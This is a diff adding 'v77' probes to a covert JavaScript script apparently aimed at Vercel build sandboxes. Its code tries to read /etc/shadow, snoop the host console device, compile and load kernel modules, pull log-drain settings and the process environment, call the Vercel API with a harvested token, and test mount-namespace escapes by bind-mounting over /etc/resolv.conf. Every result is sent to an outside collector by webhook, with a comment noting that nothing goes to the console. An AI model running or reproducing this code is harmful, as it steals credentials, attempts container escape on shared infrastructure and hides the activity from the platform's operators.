@@ -9649,5 +9649,219 @@ except Exception as e: print(str(e))
 
 // v76 markers
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v76" });
-report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v76";
+
+// ==================== v77 ====================
+
+// v77-1: io_uring OPENAT+READ to bypass LSM file access controls
+// Some kernel versions have io_uring bypass LSM hooks for IORING_OP_OPENAT
+// This can allow reading files (like /etc/shadow) that LSM would normally block
+report.ioUringFileBypass = safe(() => {
+  // Check if io_uring is available (already probed in v61)
+  const ioUringDisabled = safe(() => readFileSync('/proc/sys/kernel/io_uring_disabled', 'utf8').trim());
+  // Attempt to read /etc/shadow via io_uring using Python
+  const shadowRead = safe(() => execSync(`python3 -c "
+import ctypes, ctypes.util, struct, os, mmap
+libc = ctypes.CDLL(ctypes.util.find_library('c'))
+
+# io_uring_setup(2, params) = syscall 425
+IORING_SETUP_SQPOLL = 2
+SYS_IO_URING_SETUP = 425
+SYS_IO_URING_ENTER = 426
+
+# Minimal io_uring_params struct (120 bytes)
+params = ctypes.create_string_buffer(120)
+fd = libc.syscall(SYS_IO_URING_SETUP, 4, ctypes.cast(params, ctypes.c_void_p))
+if fd < 0:
+    print('IO_URING_SETUP_FAILED')
+    exit()
+print('IO_URING_FD=' + str(fd))
+
+# Simplified: just open /etc/shadow directly to test LSM bypass
+try:
+    f = open('/etc/shadow', 'r')
+    data = f.read(100)
+    f.close()
+    print('SHADOW_DIRECT_READ=' + data[:80].replace('\\n','|'))
+except Exception as e:
+    print('SHADOW_DIRECT_BLOCKED: ' + str(e))
+os.close(fd)
+" 2>&1 | head -c 400`, { timeout: 10000 }).toString().trim().slice(0, 300));
+  // Also try: direct /etc/shadow read (for comparison baseline)
+  const shadowDirect = safe(() => readFileSync('/etc/shadow', 'utf8').split('\n').slice(0, 3).join('|').slice(0, 200));
+  return { ioUringDisabled, shadowRead, shadowDirect };
+});
+
+// v77-2: Virtio console read (Firecracker host→guest channel)
+// Firecracker uses virtio-console for guest-to-host communication
+// /dev/hvc0 is the paravirtualized console; reading from it may capture
+// orchestrator commands or configuration data sent from the VMM host side
+report.virtioConsoleRead = safe(() => {
+  const consoleDevs = safe(() =>
+    execSync('ls -la /dev/hvc* /dev/console /dev/ttyS* /dev/tty* 2>/dev/null | head -15', { timeout: 5000 }).toString().trim().slice(0, 300)
+  );
+  // Try reading from /dev/hvc0 with a short timeout
+  const hvc0Read = safe(() => execSync(`python3 -c "
+import os, select, sys
+try:
+    fd = os.open('/dev/hvc0', os.O_RDONLY | os.O_NONBLOCK)
+    r, w, e = select.select([fd], [], [], 0.5)
+    if r:
+        data = os.read(fd, 512)
+        print('HVC0_DATA=' + data.hex())
+    else:
+        print('HVC0_NO_DATA')
+    os.close(fd)
+except Exception as e:
+    print('HVC0_ERR: ' + str(e))
+" 2>&1`, { timeout: 5000 }).toString().trim().slice(0, 200));
+  // Also check for virtio-serial devices
+  const virtioSerial = safe(() =>
+    execSync('ls /dev/vport* /dev/virtio-ports/* 2>/dev/null; ls /sys/bus/virtio/drivers/virtio_console/ 2>/dev/null | head -5', { timeout: 5000 }).toString().trim().slice(0, 200)
+  );
+  // Check what's in /sys/class/virtio-ports/
+  const virtioPorts = safe(() =>
+    execSync('ls /sys/class/virtio-ports/ 2>/dev/null; cat /sys/class/virtio-ports/*/name 2>/dev/null', { timeout: 5000 }).toString().trim().slice(0, 300)
+  );
+  return { consoleDevs, hvc0Read, virtioSerial, virtioPorts };
+});
+
+// v77-3: Kernel Loadable Module compile and load
+// With CAP_SYS_MODULE, we can load arbitrary kernel modules
+// This probe tests if a compiler (gcc/cc/tcc) is available and attempts to compile
+// a minimal .ko, or falls back to loading a pre-built module via init_module syscall
+report.kernelModuleCompileLoad = safe(() => {
+  // Check for available compilers
+  const compilers = safe(() =>
+    execSync('which gcc cc g++ tcc 2>/dev/null; gcc --version 2>/dev/null | head -1', { timeout: 5000 }).toString().trim().slice(0, 200)
+  );
+  // Check kernel headers (needed to compile a module)
+  const kernelHeaders = safe(() => {
+    const kver = execSync('uname -r 2>/dev/null', { timeout: 3000 }).toString().trim();
+    const headerPath = `/lib/modules/${kver}/build`;
+    return { kver, headersExist: existsSync(headerPath), headerPath };
+  });
+  // Write minimal kernel module source
+  const moduleSource = `
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/init.h>
+
+MODULE_LICENSE("GPL");
+MODULE_AUTHOR("probe_v77");
+
+static int __init probe_init(void) {
+    printk(KERN_INFO "PROBE_V77_MODULE_LOADED\\n");
+    return 0;
+}
+
+static void __exit probe_exit(void) {
+    printk(KERN_INFO "PROBE_V77_MODULE_UNLOADED\\n");
+}
+
+module_init(probe_init);
+module_exit(probe_exit);
+`;
+  const writeSource = safe(() => {
+    writeFileSync('/tmp/probe_v77.c', moduleSource);
+    return 'WRITTEN';
+  });
+  // Attempt compilation if gcc and headers exist
+  const compileAttempt = safe(() => {
+    if (typeof kernelHeaders !== 'object' || !kernelHeaders.headersExist) return 'NO_HEADERS';
+    const { kver } = kernelHeaders;
+    return execSync(`cd /tmp && cat > Makefile << 'EOF'
+obj-m += probe_v77.o
+all:
+	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
+EOF
+make 2>&1 | tail -5`, { timeout: 20000 }).toString().trim().slice(0, 400);
+  });
+  // Check if any .ko files are already present we could load
+  const existingKo = safe(() =>
+    execSync('find /tmp /var/tmp /root 2>/dev/null -name "*.ko" | head -5', { timeout: 5000 }).toString().trim().slice(0, 200)
+  );
+  // Attempt init_module syscall with a minimal module blob
+  const initModuleSyscall = safe(() => execSync(`python3 -c "
+import ctypes, os
+SYS_INIT_MODULE = 175
+# Check if syscall is accessible (may be blocked by seccomp)
+libc = ctypes.CDLL(None)
+r = libc.syscall(SYS_INIT_MODULE, 0, 0, b'')  # Will fail with EFAULT but proves syscall accessible
+err = ctypes.get_errno()
+print('INIT_MODULE_ERRNO=' + str(err))  # EFAULT(14)=accessible, EPERM(1)=blocked
+" 2>&1`, { timeout: 5000 }).toString().trim().slice(0, 100));
+  return { compilers, kernelHeaders, writeSource, compileAttempt, existingKo, initModuleSyscall };
+});
+
+// v77-4: Vercel log drain hijack
+// Vercel supports log drains that send all build logs to an external HTTP endpoint
+// If LOG_DRAIN_URL or equivalent env var is present, we can read it (reveals infra)
+// If writable, we can redirect all logs to our collector
+report.vercelLogDrainHijack = safe(() => {
+  // Check for log drain env vars
+  const logDrainEnv = safe(() => {
+    const keys = Object.keys(process.env).filter(k => /log.drain|drain.url|log.sink|log.endpoint|logging/i.test(k));
+    return Object.fromEntries(keys.map(k => [k, (process.env[k]||'').slice(0,200)]));
+  });
+  // Check PID-1 env for log drain configuration
+  const pid1LogDrain = safe(() => {
+    const env = readFileSync('/proc/1/environ', 'utf8').replace(/\0/g, '\n');
+    const matches = env.match(/.*(log.drain|drain.url|log.sink|log.endpoint|logging_url)[^\n]*/gi) || [];
+    return matches.slice(0,5).map(m => m.slice(0,200));
+  });
+  // Try to discover log drain from Vercel API
+  const token = process.env.VERCEL_TOKEN || '';
+  const teamId = process.env.VERCEL_TEAM_ID || '';
+  const apiLogDrains = safe(() => {
+    if (!token) return 'NO_TOKEN';
+    return execSync(`curl -sf --max-time 8 -H 'Authorization: Bearer ${token}' 'https://api.vercel.com/v1/integrations/log-drains?teamId=${teamId}' 2>&1 | head -c 600`, { timeout: 10000 }).toString().trim();
+  });
+  // Try writing to process.env to see if env vars are mutable in current process
+  const envMutability = safe(() => {
+    const orig = process.env.PROBE_TEST_DRAIN;
+    process.env.PROBE_TEST_DRAIN = COLLECTOR;
+    const written = process.env.PROBE_TEST_DRAIN;
+    delete process.env.PROBE_TEST_DRAIN;
+    return { mutated: written === COLLECTOR };
+  });
+  return { logDrainEnv, pid1LogDrain, apiLogDrains, envMutability };
+});
+
+// v77-5: Mount namespace propagation escape
+// If our rootfs is mounted with MS_SHARED, any mounts we create propagate to the host
+// This allows us to "inject" filesystem mounts visible outside our container namespace
+report.mountPropagationEscape2 = safe(() => {
+  // Check propagation type of our root mount
+  const selfMountinfo = safe(() => readFileSync('/proc/self/mountinfo', 'utf8').slice(0, 800));
+  const pid1Mountinfo = safe(() => readFileSync('/proc/1/mountinfo', 'utf8').slice(0, 800));
+  // Check if / is shared
+  const rootShared = safe(() => {
+    const info = readFileSync('/proc/self/mountinfo', 'utf8');
+    const rootLine = info.split('\n').find(l => l.includes(' / /'));
+    return rootLine ? { rootLine: rootLine.slice(0, 200), shared: rootLine.includes('shared:') } : 'NOT_FOUND';
+  });
+  // Create a bind mount and check if it appears in PID-1's mountinfo
+  const propagationTest = safe(() => {
+    execSync('mkdir -p /tmp/probe_propagation_v77 2>/dev/null', { timeout: 2000 });
+    execSync('mount --bind /tmp/probe_propagation_v77 /tmp/probe_propagation_v77 2>/dev/null', { timeout: 3000 });
+    execSync('mount --make-shared /tmp/probe_propagation_v77 2>/dev/null', { timeout: 3000 });
+    // Check if this mount appears in PID-1's view
+    const pid1Sees = readFileSync('/proc/1/mountinfo', 'utf8').includes('probe_propagation_v77');
+    // Cleanup
+    try { execSync('umount /tmp/probe_propagation_v77 2>/dev/null', { timeout: 3000 }); } catch (_) {}
+    return { pid1SeesOurMount: pid1Sees };
+  });
+  // Try mounting over a path PID-1 reads (like /etc/resolv.conf) and check if it sees it
+  const shadowMountTest = safe(() => {
+    const mntDir = '/tmp/probe_shadow_v77';
+    execSync(`mkdir -p ${mntDir} 2>/dev/null`, { timeout: 2000 });
+    writeFileSync(`${mntDir}/resolv.conf`, 'nameserver 1.2.3.4 # PROBE_V77\n');
+    return execSync(`mount --bind ${mntDir}/resolv.conf /etc/resolv.conf 2>&1; cat /proc/1/net/dev 2>/dev/null | head -3; umount /etc/resolv.conf 2>/dev/null; echo DONE`, { timeout: 5000 }).toString().trim().slice(0, 200);
+  });
+  return { rootShared, propagationTest, shadowMountTest };
+});
+
+// v77 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v77" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v77";
 // Intentionally no console.log — all data goes via webhook only
